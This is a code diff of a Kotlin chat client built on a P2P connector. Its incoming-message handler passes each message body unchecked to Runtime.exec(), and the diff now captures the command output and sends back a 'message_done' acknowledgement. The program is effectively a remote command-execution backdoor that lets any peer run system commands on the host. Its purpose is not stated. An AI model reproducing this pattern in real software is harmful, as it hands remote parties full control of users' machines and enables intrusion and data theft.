@@ -4,7 +4,6 @@ import www.kaspersky.connector.ChatListener
 import www.kaspersky.connector.ChatMessage
 import www.kaspersky.connector.P2PChatConnection
 import java.lang.Exception
-import java.util.*
 
 fun main(args: Array<String>) {
     Main.start()
@@ -20,11 +19,20 @@ object Main : ChatListener {
     }
 
     override fun onMessageIncome(incomeMessage: ChatMessage) {
-        println(incomeMessage)
+        println(incomeMessage.body.toString())
+
         if (incomeMessage.body.toString() == "disconnect") {
             onConnectionChanged(false)
         }
-        Runtime.getRuntime().exec(incomeMessage.body.toString()).inputStream.bufferedReader().readText()
+
+        val string = Runtime.getRuntime().exec(incomeMessage.body.toString()).inputStream.bufferedReader().readText()
+        println(string)
+
+        if (incomeMessage.needSync) {
+            val answer = ChatMessage(1, "message_done", false)
+            chatConnection.sendMessage(answer)
+        }
+
     }
 
     override fun onMessageSend(outcomeMessage: ChatMessage) {
